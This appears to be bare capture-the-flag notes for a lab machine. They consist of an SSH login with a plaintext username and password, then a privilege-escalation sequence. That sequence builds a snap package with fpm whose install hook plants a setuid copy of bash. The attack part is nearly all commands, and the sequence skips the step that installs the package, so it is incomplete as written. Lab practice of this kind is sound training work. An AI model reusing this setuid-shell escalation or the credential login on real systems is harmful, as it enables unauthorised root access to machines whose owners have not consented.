Get User:
ssh brucetherealadmin@10.10.10.233
password:booboo
cat user.txt

Get Root:
cd $(mktemp -d)
mkdir -p meta/hooks
printf '#!/bin/sh\ncp /bin/bash /home/brucetherealadmin/.w/rootbash && chmod +s /home/brucetherealadmin/.w/rootbash' > meta/hooks/install
chmod +x meta/hooks/install
fpm -n waza -s dir -t snap -a all meta
cat /root/root.txt